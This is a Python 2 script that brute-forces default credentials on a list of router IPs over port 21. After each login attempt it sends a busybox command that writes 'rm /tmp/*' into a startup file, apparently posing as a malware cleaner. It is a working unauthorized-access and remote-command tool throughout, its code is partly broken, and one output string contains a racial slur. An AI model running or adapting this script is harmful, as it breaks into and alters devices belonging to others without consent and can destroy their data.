#!/usr/bin/python
# -*- coding: utf8 -*-

import socket
import re
import sys
import Queue
import threading
import time
from itertools import cycle
from string import *

if len (sys.argv) < 2:
	print "usage : {0} inFile threads timeout bufsize".format(sys.argv[0])
	sys.exit(0)

inFile = sys.argv[1]
threads = sys.argv[2]
bufsiz = int(sys.argv[3])

#for bruting
usernames = ["root\0", "admin\0", "user\0", "login\0", "guest\0",
			 "anonymous\0", "ftp\0"]
passwords = ["root\0", "\0", "toor\0", "admin\0", "user\0", "guest\0", 
			"login\0", "changeme\0", "1234\0", "12345\0", 
			"123456\0", "default\0", "pass\0", "password\0",
			 "ftp\0", "anonymous\0"]

cmd = "/bin/busybox; echo -e REMOVE MALWARE; echo rm /tmp/* > etc/rc.d; "
validR = False



routers = []

IAC  = chr(255) # ayy lmao : http://svn.python.org/projects/python/trunk/Demo/sockets/telnet.py
DONT = chr(254)
DO   = chr(253)
WONT = chr(252)
WILL = chr(251)

with open(inFile, "rb") as f:
	routers = f.readlines()
	f.close()

q = Queue.Queue()
for router in routers:
	q.put(router)


def rifk(queue):
	queue_full = True
	while queue_full:
		try:
			router = queue.get(False)
			router = router.replace('\r', '').replace('\n', '')
			router = router.split(":")
			ip = router[:1]
			ip = ip[0]
			#print router
		except Queue.Empty:
			queue_full = False
		login(ip)


def sendShit(shit):
	sock.send(shit + "\r\n")
	#print "sent some shit"

def login(ip):

	iac = 0
	opt = ''
	global sock
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		sock.connect((ip, 21))
		print "Connected"
	except:
		print "Failed to connect."
		sys.exit()

	
	while 1:
		data = sock.recv(bufsiz)
		if not data:
			print "closed by remote host"
			print "dead".format(ip)
			sys.exit()


		cleandata = ''
		for c in data:
			if opt:
				print ord(c)
				sock.send(opt + c)
				opt = ''
			elif iac:
				iac = 0
				if c == IAC:
					cleandata = cleandata + c
				elif c in (DO, DONT):
					opt = IAC + WONT
				elif c in (WILL, WONT):
					opt = IAC + DONT
				else:
					print "lol dongs", ord(c)
			elif c == IAC:
				iac = 1

			else:
				cleandata = cleandata + c
		try:
			zip_list = zip(passwords, cycle(usernames)) if len(passwords) > len(usernames) else zip(cycle(passwords), usernames)
			for i in zip_list:
				user  = i[1]
				passw = i[0]
				sendShit("USER " + user)
				time.sleep(2)
				sendShit("PASS " + passw)
				time.sleep(2)
				sendShit(cmd)
				print "sent some shit"
				success = sock.recv(bufsiz)
				print success
				sendShit("PASS " + passw)
				if "REMOVE MALWARE" in success:
					print "cleaned some niggas up"
				else:
					print "sad faces"

		except Exception as e:
			print "Exception. ({0})".format(str(e))





for i in range(int(threads)):
	t = threading.Thread(target=rifk, args = (q,))
	t.start()


				



